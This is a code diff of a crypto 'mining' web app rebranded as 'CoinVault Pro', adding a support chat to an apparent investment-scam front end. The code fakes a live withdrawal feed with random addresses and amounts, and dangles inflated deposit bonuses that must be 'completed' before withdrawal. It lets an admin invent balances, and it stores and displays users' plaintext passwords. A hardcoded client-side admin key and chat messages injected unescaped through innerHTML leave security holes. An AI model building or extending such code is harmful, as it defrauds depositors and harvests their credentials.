@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Web3 Mining System</title>
+    <title>CoinVault Pro</title>
     <style>
         :root { --bg: #0b0e11; --card: #1e2329; --gold: #f3ba2f; --gray: #848e9c; --green: #2ebd85; --border: #2b3139; --red: #f6465d; }
         body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: #fff; margin: 0; padding-bottom: 80px; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
@@ -30,37 +30,39 @@
         .admin-table th, .admin-table td { border: 1px solid #333; padding: 8px; text-align: left; font-size: 12px; color: #fff; }
         .admin-table th { background: #2b3139; color: var(--gold); }
         .btn-action { padding: 4px 8px; border-radius: 4px; border: none; cursor: pointer; font-size: 10px; margin-right: 2px; }
+        #chat-widget { position: fixed; bottom: 70px; right: 20px; z-index: 999; }
+        #chat-box { display: none; width: 300px; height: 400px; background: #1e2329; border: 1px solid var(--gold); border-radius: 10px; flex-direction: column; overflow: hidden; }
+        #chat-messages { flex: 1; overflow-y: auto; padding: 10px; font-size: 12px; }
     </style>
 </head>
 <body translate="no">
-    <div id="loading_screen" style="position:fixed; inset:0; background:var(--bg); z-index:9000; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--gold); font-weight:bold;">WEB3 CONNECTING...</div>
+    <div id="loading_screen" style="position:fixed; inset:0; background:var(--bg); z-index:9000; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--gold); font-weight:bold;">COINVAULT PRO CONNECTING...</div>
     <div id="toast"></div>
 
     <div id="adminPanel">
         <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-            <h2 style="color:var(--gold)">MANAGER SYSTEM</h2>
+            <h2 style="color:var(--gold)">COINVAULT PRO MANAGER</h2>
             <button onclick="document.getElementById('adminPanel').style.display='none'" style="background:var(--red); color:#fff; border:none; padding:8px 15px; border-radius:5px;">CLOSE</button>
         </div>
         <div class="admin-layout">
-            <div class="admin-col">
-                <h4 style="color:var(--gold)">Yêu cầu Nạp/Rút (Chờ duyệt)</h4>
-                <div id="adminRequests"></div>
+            <div class="admin-col"><h4 style="color:var(--gold)">Yêu cầu Nạp/Rút (Chờ duyệt)</h4><div id="adminRequests"></div></div>
+            <div class="admin-col" style="border: 1px solid var(--gold); padding: 10px; border-radius: 10px;">
+                <h4 style="color:var(--gold)">CSKH - Hỗ trợ</h4>
+                <div id="adminChatList" style="height: 100px; overflow-y: auto; border-bottom: 1px solid #333; margin-bottom: 10px;"></div>
+                <div id="adminChatBox" style="height: 200px; overflow-y: auto; background: #000; padding: 5px; margin-bottom: 10px;"></div>
+                <input type="text" id="adminInput" class="login-input" placeholder="Trả lời...">
+                <button class="login-btn" onclick="sendAdminMsg()">GỬI</button>
             </div>
             <div class="admin-col">
                 <h4 style="color:var(--gold)">Danh sách người dùng</h4>
-                <table class="admin-table">
-                    <thead><tr><th>Email</th><th>USDT</th><th>Phát</th></tr></thead>
-                    <tbody id="adminUserList"></tbody>
-                </table>
-                <div id="bonusControlArea" style="margin-top:20px; padding:15px; border:1px solid var(--gold); border-radius:12px; background:#1e2329;">
-                    <p style="color:var(--gray)">Chọn người dùng để phát thưởng...</p>
-                </div>
+                <table class="admin-table"><thead><tr><th>Email</th><th>USDT</th><th>Phát</th></tr></thead><tbody id="adminUserList"></tbody></table>
+                <div id="bonusControlArea" style="margin-top:20px; padding:15px; border:1px solid var(--gold); border-radius:12px; background:#1e2329;"><p style="color:var(--gray)">Chọn người dùng để phát thưởng...</p></div>
             </div>
         </div>
     </div>
 
     <div id="authPage" style="position:fixed; inset:0; background:var(--bg); z-index:8000; display:none; flex-direction:column; justify-content:center; padding:30px;">
-        <div style="text-align: center; margin-bottom: 30px;"><div class="logo-circle" style="width:60px; height:60px; margin: 0 auto; font-size: 30px;">₿</div></div>
+        <div style="text-align: center; margin-bottom: 30px;"><div class="logo-circle" style="width:60px; height:60px; margin: 0 auto; font-size: 30px;">₿</div><div style="margin-top:10px; color:var(--gold); font-weight:bold;">COINVAULT PRO</div></div>
         <div id="regForm">
             <input type="email" id="regEmail" class="login-input" placeholder="Email">
             <input type="password" id="regPass" class="login-input" placeholder="Password">
@@ -75,10 +77,20 @@
         </div>
     </div>
 
+    <div id="chat-widget">
+        <div id="chat-box">
+            <div id="chat-title" style="padding:10px; background:var(--gold); color:#000; font-weight:bold;">CSKH Trực Tuyến</div>
+            <div id="chat-messages"></div>
+            <input type="text" id="userChatInput" class="login-input" placeholder="Nhắn tin...">
+            <button onclick="sendUserMsg()" style="width:100%; padding:5px; background:var(--green)">GỬI</button>
+        </div>
+        <button onclick="toggleChat()" style="background:var(--gold); border-radius:50%; width:50px; height:50px; border:none; font-size:20px;">💬</button>
+    </div>
+
     <div class="header">
         <div style="display: flex; align-items: center;">
             <div class="logo-circle" style="margin-right:10px" onclick="openAdminPortal()">₿</div>
-            <div id="topUserEmail" style="font-size: 11px; color: var(--gold); font-weight: bold; max-width: 120px; overflow: hidden; text-overflow: ellipsis;">Guest</div>
+            <div id="topUserEmail" style="font-size: 11px; color: var(--gold); font-weight: bold; max-width: 120px; overflow: hidden; text-overflow: ellipsis;">CoinVault Pro</div>
         </div>
         <select id="langSel" style="background:#2b3139; color:var(--gold); border:1px solid var(--gold); border-radius:5px; font-size:11px; padding:3px;" onchange="changeLang()">
             <option value="en">English</option><option value="vi">Tiếng Việt</option>
@@ -87,7 +99,12 @@
     </div>
 
     <div id="home" class="page active">
-        <div style="margin-bottom:12px; font-size:12px; color:var(--gray);"><span id="l_welcome">Welcome</span>: <span id="welcomeEmail" style="color:#fff;">...</span></div>
+        <div style="margin-bottom:12px; font-size:12px; color:var(--gray);"><span id="l_welcome">Welcome</span>: <span id="welcomeEmail" style="color:#fff;">CoinVault Pro</span></div>
+        
+        <div style="text-align: right; margin-bottom: 8px;">
+            <span style="font-size: 18px; font-weight: 800; color: #fff; letter-spacing: 1px; text-transform: uppercase;">COINVAULT PRO</span>
+        </div>
+
         <div class="card" style="background: linear-gradient(135deg, #2ebd85 0%, #1e2329 100%);">
             <div style="display:flex; justify-content:space-between;"><span id="l_balance">Balance (USDT)</span><span onclick="toggleView()" style="cursor:pointer;">👁️</span></div>
             <h2 id="usdt_H" style="font-size: 36px; margin: 12px 0;">$ 0.00</h2>
@@ -166,77 +183,71 @@
         const firebaseConfig = { apiKey: "AIzaSyB355waMca7L5Y3VG3efDWZTUuaEQpjwm0", databaseURL: "https://wed3pro-default-rtdb.firebaseio.com", projectId: "wed3pro" };
         const app = initializeApp(firebaseConfig); const auth = getAuth(app); const db = getDatabase(app);
         window.fb = { auth, db, ref, set, get, update, onValue, push, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut };
+        
+        window.toggleChat = () => { const b = document.getElementById('chat-box'); b.style.display = b.style.display === 'flex' ? 'none' : 'flex'; };
+        
+        const renderMessages = (messagesObj, containerId) => {
+            const container = document.getElementById(containerId);
+            container.innerHTML = "";
+            if (!messagesObj) { container.innerHTML = `<div style="color:var(--gold)"><b>Admin:</b> Chào bạn! Tôi có thể giúp gì cho bạn?</div>`; return; }
+            Object.values(messagesObj).forEach(m => {
+                const senderLabel = m.sender === 'user' ? (m.email || 'User') : 'Admin';
+                container.innerHTML += `<div style="margin:5px 0; color:${m.sender==='admin'?'#fff':'var(--gold)'}"><b>${senderLabel}:</b> ${m.text}</div>`;
+            });
+            container.scrollTop = container.scrollHeight;
+        };
+
+        window.sendUserMsg = () => { const input = document.getElementById('userChatInput'); if(input.value.trim() === "" || !auth.currentUser) return; fb.push(fb.ref(fb.db, 'chats/'+auth.currentUser.uid+'/messages'), { sender: 'user', text: input.value, email: auth.currentUser.email, time: Date.now() }); input.value = ""; };
+        window.sendAdminMsg = () => { const input = document.getElementById('adminInput'); if(input.value.trim() === "" || !window.currentChatUid) return; fb.push(fb.ref(fb.db, 'chats/'+window.currentChatUid+'/messages'), { sender: 'admin', text: input.value, time: Date.now() }); input.value = ""; };
+        
         onAuthStateChanged(auth, (user) => {
             document.getElementById('loading_screen').style.display = 'none';
-            if(user) { document.getElementById('authPage').style.display = 'none'; loadUserData(user.uid); document.getElementById('topUserEmail').innerText = user.email; document.getElementById('welcomeEmail').innerText = user.email; document.getElementById('accEmailText').innerText = user.email; } else { document.getElementById('authPage').style.display = 'flex'; }
+            if(user) { 
+                document.getElementById('authPage').style.display = 'none';
+                document.getElementById('topUserEmail').innerText = user.email;
+                document.getElementById('welcomeEmail').innerText = user.email;
+                document.getElementById('accEmailText').innerText = user.email;
+                loadUserData(user.uid); 
+                fb.onValue(fb.ref(fb.db, 'chats/'+user.uid+'/messages'), (s) => renderMessages(s.val(), 'chat-messages'));
+                fb.onValue(fb.ref(fb.db, 'chats'), (s) => { const list = document.getElementById('adminChatList'); list.innerHTML = ""; s.forEach(c => { fb.get(fb.ref(fb.db, 'users/'+c.key)).then(snap => { const u = snap.val(); list.innerHTML += `<div style="cursor:pointer; color:var(--gold); margin:5px 0" onclick="window.currentChatUid='${c.key}'; loadAdminChat('${c.key}')">User: ${u ? u.email : c.key.slice(0,8)}</div>`; }); }); }); 
+            } else { document.getElementById('authPage').style.display = 'flex'; }
         });
+
+        window.loadAdminChat = (uid) => { window.currentChatUid = uid; fb.onValue(fb.ref(fb.db, 'chats/'+uid+'/messages'), (s) => renderMessages(s.val(), 'adminChatBox')); };
     </script>
     <script>
-        // ... (giữ nguyên các phần khai báo và hàm cũ)
         const trans = {
-            en: { welcome: "Welcome", balance: "Balance (USDT)", start: "Start", addr_t: "Deposit USDT (BEP20):", btn_dep: "ACTIVATE CONTRACT", nav_h: "Home", nav_e: "Exchange", nav_w: "Withdraw", nav_a: "Account", ex_t: "Profit Exchange", ex_btn: "TRANSFER TO BALANCE", acc_t: "Security Vault", acc_btn: "VERIFY", main_mar: "NOTICE: First deposit bonus double. Contact Admin!", promo_mar: "1. Initial deposit of 500$ will receive a 1,000$ bonus for new users.<br>2. Initial deposit of 1,000$ will receive a 1,500$ bonus for new users.<br>3. Initial deposit of 2,000$ will receive a 2,500$ bonus for new users.<br>4. Initial deposit of 3,000$ will receive a 3,500$ bonus for new users.<br>5. Initial deposit of 4,000$ will receive a 4,500$ bonus for new users.<br><b style='color:#fff'>IT IS RECOMMENDED TO COMPLETE THE PROMOTIONS BEFORE WITHDRAWING!</b>" },
-            vi: { welcome: "Chào mừng", balance: "Số dư (USDT)", start: "Bắt đầu", addr_t: "Nạp USDT (BEP20):", btn_dep: "KÍCH HOẠT HỢP ĐỒNG", nav_h: "Trang chủ", nav_e: "Quy đổi", nav_w: "Rút tiền", nav_a: "Tài khoản", ex_t: "Quy đổi lợi nhuận", ex_btn: "CHUYỂN VỀ VỐN", acc_t: "Két sắt bảo mật", acc_btn: "XÁC MINH", main_mar: "THÔNG BÁO: Ưu đãi nạp lần đầu nhận ngay bonus gấp đôi. Liên hệ Admin!", promo_mar: "1. Nạp đầu 500$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.000$<br>2. Nạp đầu 1.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.500$<br>3. Nạp đầu 2.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 2.500$<br>4. Nạp đầu 3.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 3.500$<br>5. Nạp đầu 4.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 4.500$<br><b style='color:#fff'>KHUYẾN KHÍCH QUÝ KHÁCH HOÀN THÀNH CÁC ƯU ĐÃI TRƯỚC KHI RÚT TIỀN!</b>" },
-            zh: { welcome: "欢迎", balance: "余额 (USDT)", start: "开始", addr_t: "充值 USDT (BEP20):", btn_dep: "激活合约", nav_h: "首页", nav_e: "兑换", nav_w: "提现", nav_a: "账户", ex_t: "利润兑换", ex_btn: "转入余额", acc_t: "安全库", acc_btn: "验证", main_mar: "公告：首次存款奖金加倍。联系管理员！", promo_mar: "1. 新用户首次存款 500$，即可获得 1.000$ 奖励。<br>2. 新用户首次存款 1.000$，即可获得 1.500$ 奖励。<br>3. 新用户首次存款 2.000$，即可获得 2.500$ 奖励。<br>4. 新用户首次存款 3.000$，即可获得 3.500$ 奖励。<br>5. 新用户首次存款 4.000$，即可获得 4.500$ 奖励。<br><b style='color:#fff'>提现前请务必完成优惠活动！</b>" },
-            es: { welcome: "Bienvenido", balance: "Saldo (USDT)", start: "Inicio", addr_t: "Depósito (BEP20):", btn_dep: "ACTIVAR CONTRATO", nav_h: "Inicio", nav_e: "Canje", nav_w: "Retirar", nav_a: "Cuenta", ex_t: "Canje de Ganancias", ex_btn: "TRANSFERIR", acc_t: "Bóveda", acc_btn: "VERIFICAR", main_mar: "AVISO: Bono de primer depósito doble. ¡Contacte a Admin!", promo_mar: "1. Depósito inicial de 500$ recibirá una bonificación de 1.000$ para nuevos usuarios.<br>2. Depósito inicial de 1.000$ recibirá una bonificación de 1.500$ para nuevos usuarios.<br>3. Depósito inicial de 2.000$ recibirá una bonificación de 2.500$ para nuevos usuarios.<br>4. Depósito inicial de 3.000$ recibirá una bonificación de 3.500$ para nuevos usuarios.<br>5. Depósito inicial de 4.000$ recibirá una bonificación de 4.500$ para nuevos usuarios.<br><b style='color:#fff'>¡SE RECOMIENDA COMPLETAR LAS PROMOCIONES ANTES DE RETIRAR!</b>" },
-            pt: { welcome: "Bem-vindo", balance: "Saldo (USDT)", start: "Início", addr_t: "Depósito (BEP20):", btn_dep: "ATIVAR CONTRATO", nav_h: "Início", nav_e: "Troca", nav_w: "Retirar", nav_a: "Conta", ex_t: "Troca de Lucro", ex_btn: "TRANSFERIR", acc_t: "Cofre", acc_btn: "VERIFICAR", main_mar: "AVISO: Bônus de primeiro depósito dobro. Contate o Admin!", promo_mar: "1. Depósito inicial de 500$ receberá um bônus de 1.000$ para novos usuários.<br>2. Depósito inicial de 1.000$ receberá um bônus de 1.500$ para novos usuários.<br>3. Depósito inicial de 2.000$ receberá um bônus de 2.500$ para novos usuários.<br>4. Depósito inicial de 3.000$ receberá um bônus de 3.500$ para novos usuários.<br>5. Depósito inicial de 4.000$ receberá um bônus de 4.500$ para novos usuários.<br><b style='color:#fff'>RECOMENDA-SE COMPLETAR AS PROMOÇÕES ANTES DE SACAR!</b>" }
+            en: { welcome: "Welcome", balance: "Balance (USDT)", start: "Start", addr_t: "Deposit USDT (BEP20):", btn_dep: "ACTIVATE CONTRACT", nav_h: "Home", nav_e: "Exchange", nav_w: "Withdraw", nav_a: "Account", ex_t: "Profit Exchange", ex_btn: "TRANSFER TO BALANCE", acc_t: "Security Vault", acc_btn: "VERIFY", main_mar: "NOTICE: First deposit bonus double. Contact Admin!", promo_mar: "1. Initial deposit of 500$ will receive a 1,000$ bonus for new users.<br>2. Initial deposit of 1,000$ will receive a 1,500$ bonus for new users.<br>3. Initial deposit of 2,000$ will receive a 2,500$ bonus for new users.<br>4. Initial deposit of 3,000$ will receive a 3,500$ bonus for new users.<br>5. Initial deposit of 4,000$ will receive a 4,500$ bonus for new users.<br><b style='color:#fff'>IT IS RECOMMENDED TO COMPLETE THE PROMOTIONS BEFORE WITHDRAWING!</b>", chat_title: "Live Support", chat_input: "Message..." },
+            vi: { welcome: "Chào mừng", balance: "Số dư (USDT)", start: "Bắt đầu", addr_t: "Nạp USDT (BEP20):", btn_dep: "KÍCH HOẠT HỢP ĐỒNG", nav_h: "Trang chủ", nav_e: "Quy đổi", nav_w: "Rút tiền", nav_a: "Tài khoản", ex_t: "Quy đổi lợi nhuận", ex_btn: "CHUYỂN VỀ VỐN", acc_t: "Két sắt bảo mật", acc_btn: "XÁC MINH", main_mar: "THÔNG BÁO: Ưu đãi nạp lần đầu nhận ngay bonus gấp đôi. Liên hệ Admin!", promo_mar: "1. Nạp đầu 500$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.000$<br>2. Nạp đầu 1.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.500$<br>3. Nạp đầu 2.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 2.500$<br>4. Nạp đầu 3.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 3.500$<br>5. Nạp đầu 4.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 4.500$<br><b style='color:#fff'>KHUYẾN KHÍCH QUÝ KHÁCH HOÀN THÀNH CÁC ƯU ĐÃI TRƯỚC KHI RÚT TIỀN!</b>", chat_title: "CSKH Trực Tuyến", chat_input: "Nhắn tin..." },
+            zh: { welcome: "欢迎", balance: "余额 (USDT)", start: "开始", addr_t: "充值 USDT (BEP20):", btn_dep: "激活合约", nav_h: "首页", nav_e: "兑换", nav_w: "提现", nav_a: "账户", ex_t: "利润兑换", ex_btn: "转入余额", acc_t: "安全库", acc_btn: "验证", main_mar: "公告：首次存款奖金加倍。联系管理员！", promo_mar: "1. 新用户首次存款 500$，即可获得 1.000$ 奖励。<br>2. 新用户首次存款 1.000$，即可获得 1.500$ 奖励。<br>3. 新用户首次存款 2.000$，即可获得 2.500$ 奖励。<br>4. 新用户首次存款 3.000$，即可获得 3.500$ 奖励。<br>5. 新用户首次存款 4.000$，即可获得 4.500$ 奖励。<br><b style='color:#fff'>提现前请务必完成优惠活动！</b>", chat_title: "在线客服", chat_input: "输入消息..." },
+            es: { welcome: "Bienvenido", balance: "Saldo (USDT)", start: "Inicio", addr_t: "Depósito (BEP20):", btn_dep: "ACTIVAR CONTRATO", nav_h: "Inicio", nav_e: "Canje", nav_w: "Retirar", nav_a: "Cuenta", ex_t: "Canje de Ganancias", ex_btn: "TRANSFERIR", acc_t: "Bóveda", acc_btn: "VERIFICAR", main_mar: "AVISO: Bono de primer depósito doble. ¡Contacte a Admin!", promo_mar: "1. Depósito inicial de 500$ recibirá una bonificación de 1.000$ para nuevos usuarios.<br>2. Depósito inicial de 1.000$ recibirá una bonificación de 1.500$ para nuevos usuarios.<br>3. Depósito inicial de 2.000$ recibirá una bonificación de 2.500$ para nuevos usuarios.<br>4. Depósito inicial de 3.000$ recibirá una bonificación de 3.500$ para nuevos usuarios.<br>5. Depósito inicial de 4.000$ recibirá una bonificación de 4.500$ para nuevos usuarios.<br><b style='color:#fff'>¡SE RECOMIENDA COMPLETAR LAS PROMOCIONES ANTES DE RETIRAR!</b>", chat_title: "Soporte", chat_input: "Mensaje..." },
+            pt: { welcome: "Bem-vindo", balance: "Saldo (USDT)", start: "Início", addr_t: "Depósito (BEP20):", btn_dep: "ATIVAR CONTRATO", nav_h: "Início", nav_e: "Troca", nav_w: "Retirar", nav_a: "Conta", ex_t: "Troca de Lucro", ex_btn: "TRANSFERIR", acc_t: "Cofre", acc_btn: "VERIFICAR", main_mar: "AVISO: Bônus de primeiro depósito dobro. Contate o Admin!", promo_mar: "1. Depósito inicial de 500$ receberá um bônus de 1.000$ para novos usuários.<br>2. Depósito inicial de 1.000$ receberá um bônus de 1.500$ para novos usuários.<br>3. Depósito inicial de 2.000$ receberá um bônus de 2.500$ para novos usuários.<br>4. Depósito inicial de 3.000$ receberá um bônus de 3.500$ para novos usuários.<br>5. Depósito inicial de 4.000$ receberá um bônus de 4.500$ para novos usuários.<br><b style='color:#fff'>RECOMENDA-SE COMPLETAR AS PROMOÇÕES ANTES DE SACAR!</b>", chat_title: "Suporte", chat_input: "Mensagem..." }
         };
-        function changeLang() { const l = document.getElementById('langSel').value; const t = trans[l]; for (let key in t) { const el = document.getElementById('l_' + key); if(el) el.innerText = t[key]; } document.getElementById('main_marquee').innerText = t.main_mar; document.getElementById('promo_marquee').innerHTML = t.promo_mar; }
-        window.openAdminPortal = function() { if (prompt("Manager Key:") === "258369@@") { document.getElementById('adminPanel').style.display = 'block'; loadAdminPanel(); } };
         
+        function changeLang() { 
+            const l = document.getElementById('langSel').value; 
+            const t = trans[l]; 
+            for (let key in t) { const el = document.getElementById('l_' + key); if(el) el.innerText = t[key]; } 
+            document.getElementById('main_marquee').innerText = t.main_mar; 
+            document.getElementById('promo_marquee').innerHTML = t.promo_mar;
+            document.getElementById('chat-title').innerText = t.chat_title;
+            document.getElementById('userChatInput').placeholder = t.chat_input;
+        }
+
+        window.openAdminPortal = function() { if (prompt("Manager Key:") === "258369@@") { document.getElementById('adminPanel').style.display = 'block'; loadAdminPanel(); } };
         function loadAdminPanel() {
             fb.onValue(fb.ref(fb.db, 'admin/requests'), (snap) => {
                 const list = document.getElementById('adminRequests'); list.innerHTML = "";
-                if(snap.exists()) {
-                    snap.forEach((c) => { 
-                        const r = c.val(); 
-                        if(r.status === 'pending') {
-                            const d = document.createElement('div'); d.className = "req-card";
-                            d.innerHTML = `<b>${(r.type||'').toUpperCase()} $${r.amount}</b><br>Email: ${r.email}<br>
-                            <button class="btn-action" style="background:var(--green); color:#fff" onclick="approveReq('${c.key}','${r.uid}',${r.amount},'${r.type}')">DUYỆT</button>
-                            <button class="btn-action" style="background:var(--red); color:#fff" onclick="fb.update(fb.ref(fb.db, 'admin/requests/${c.key}'), {status:'rejected'})">HUỶ</button>`;
-                            list.prepend(d);
-                        }
-                    });
-                }
+                if(snap.exists()) { snap.forEach((c) => { const r = c.val(); if(r.status === 'pending') { const d = document.createElement('div'); d.className = "req-card"; d.innerHTML = `<b>${(r.type||'').toUpperCase()} $${r.amount}</b><br>Email: ${r.email}<br><button class="btn-action" style="background:var(--green); color:#fff" onclick="approveReq('${c.key}','${r.uid}',${r.amount},'${r.type}')">DUYỆT</button><button class="btn-action" style="background:var(--red); color:#fff" onclick="fb.update(fb.ref(fb.db, 'admin/requests/${c.key}'), {status:'rejected'})">HUỶ</button>`; list.prepend(d); } }); }
             });
             fb.onValue(fb.ref(fb.db, 'users'), (snap) => {
                 const tbody = document.getElementById('adminUserList'); tbody.innerHTML = "";
-                snap.forEach((u) => { const d = u.val();
-                    const row = document.createElement('tr');
-                    // Gửi pass vào đây
-                    row.innerHTML = `<td>${d.email}</td><td>$${(d.usdt||0).toFixed(2)}</td><td><button class="btn-action" style="background:var(--gold); color:#000; font-weight:bold" onclick="selectUser('${u.key}','${d.email}','${d.pass}')">INFO</button></td>`;
-                    tbody.appendChild(row);
-                });
+                snap.forEach((u) => { const d = u.val(); const row = document.createElement('tr'); row.innerHTML = `<td>${d.email}</td><td>$${(d.usdt||0).toFixed(2)}</td><td><button class="btn-action" style="background:var(--gold); color:#000; font-weight:bold" onclick="selectUser('${u.key}','${d.email}','${d.pass}')">INFO</button></td>`; tbody.appendChild(row); });
             });
         }
-        function selectUser(uid, email, pass) {
-            document.getElementById('bonusControlArea').innerHTML = `
-                <p>User: <b>${email}</b></p>
-                <p>Mật khẩu: <b style="color:var(--gold)">${pass}</b></p>
-                <input type="number" id="bnsVal" class="login-input" placeholder="Số tiền thưởng...">
-                <button class="login-btn" style="background:var(--green); color:#fff" onclick="executeBonus('${uid}')">GỬI THƯỞNG</button>
-            `;
-        }
-        async function executeBonus(uid) {
-            let el = document.getElementById('bnsVal');
-            let amt = parseFloat(el.value);
-            if(!amt || amt <= 0) return;
-            let s = await fb.get(fb.ref(fb.db, 'users/'+uid));
-            let d = s.val();
-            await fb.update(fb.ref(fb.db, 'users/'+uid), {usdt: (d.usdt||0) + amt});
-            el.value = ""; 
-            showToast("Đã cộng thưởng!");
-        }
-        async function approveReq(id, uid, amt, type) { 
-            const uRef = fb.ref(fb.db, 'users/' + uid); 
-            const snap = await fb.get(uRef); 
-            const ud = snap.val(); 
-            if(type === 'deposit') { await fb.update(uRef, { usdt: (ud.usdt || 0) + amt, active: true, lastUpdate: Date.now() }); } 
-            else { if(ud.usdt >= amt) await fb.update(uRef, { usdt: ud.usdt - amt }); } 
-            await fb.update(fb.ref(fb.db, 'admin/requests/' + id), { status: 'approved' });
-            showToast("Đã duyệt!"); 
-        }
-        
+        function selectUser(uid, email, pass) { document.getElementById('bonusControlArea').innerHTML = `<p>User: <b>${email}</b></p><p>Mật khẩu: <b style="color:var(--gold)">${pass}</b></p><input type="number" id="bnsVal" class="login-input" placeholder="Số tiền thưởng..."><button class="login-btn" style="background:var(--green); color:#fff" onclick="executeBonus('${uid}')">GỬI THƯỞNG</button>`; }
+        async function executeBonus(uid) { let el = document.getElementById('bnsVal'); let amt = parseFloat(el.value); if(!amt || amt <= 0) return; let s = await fb.get(fb.ref(fb.db, 'users/'+uid)); let d = s.val(); await fb.update(fb.ref(fb.db, 'users/'+uid), {usdt: (d.usdt||0) + amt}); el.value = ""; showToast("Đã cộng thưởng!"); }
+        async function approveReq(id, uid, amt, type) { const uRef = fb.ref(fb.db, 'users/' + uid); const snap = await fb.get(uRef); const ud = snap.val(); if(type === 'deposit') { await fb.update(uRef, { usdt: (ud.usdt || 0) + amt, active: true, lastUpdate: Date.now() }); } else { if(ud.usdt >= amt) await fb.update(uRef, { usdt: ud.usdt - amt }); } await fb.update(fb.ref(fb.db, 'admin/requests/' + id), { status: 'approved' }); showToast("Đã duyệt!"); }
         let state = { usdt: 0, eth: 0, active: false, hide: false, uid: "", pass: "", lastUpdate: 0, cycle: 24*3600*1000 };
         function startTimers() { setInterval(async () => { if(state.active && state.usdt > 0) { const now = Date.now(); const passed = now - state.lastUpdate; const left = state.cycle - passed; if (left <= 0) { const profit = (state.usdt * (state.usdt >= 2000 ? 0.025 : 0.02)) / 3500; await fb.update(fb.ref(fb.db, 'users/'+state.uid), { eth: (state.eth || 0) + profit, lastUpdate: Date.now() }); } else { document.getElementById('timer_clock').innerText = [Math.floor(left/3600000), Math.floor((left%3600000)/60000), Math.floor((left%60000)/1000)].map(v=>v<10?"0"+v:v).join(":"); let p = (passed / state.cycle) * 100; document.getElementById('mining-bar').style.width = Math.min(p, 100) + "%"; document.getElementById('mining-percent').innerText = Math.floor(Math.min(p, 100)) + "%"; let sd = new Date(state.lastUpdate); document.getElementById('start_time_txt').innerText = sd.getHours() + ":" + sd.getMinutes().toString().padStart(2,'0'); } } }, 1000); const live = document.getElementById('withdrawLive'); setInterval(() => { const d = document.createElement('div'); d.innerHTML = `0x${Math.random().toString(16).slice(2,6)}... withdrawn <span style="color:var(--green)">+$${(Math.random()*300).toFixed(1)}</span>`; live.prepend(d); if(live.children.length > 3) live.lastChild.remove(); }, 5000); }
         function updateDisplay() { const total = state.usdt + (state.eth * 3500); const v = state.hide ? "****" : "$ " + total.toLocaleString('en-US',{minimumFractionDigits:2}); document.getElementById('usdt_H').innerText = v; document.getElementById('usdt_A').innerText = v; document.getElementById('usdt_W').innerText = "$ " + state.usdt.toLocaleString('en-US',{minimumFractionDigits:2}); document.getElementById('ex_eth_val').value = state.eth.toFixed(6) + " ETH"; document.getElementById('ex_usdt_res').value = (state.eth * 3500).toFixed(2) + " USDT"; document.getElementById('L_st').innerText = "Profit: " + state.eth.toFixed(6) + " ETH"; if(state.active && state.usdt > 0) document.getElementById('mining-status-box').style.display = 'block'; }
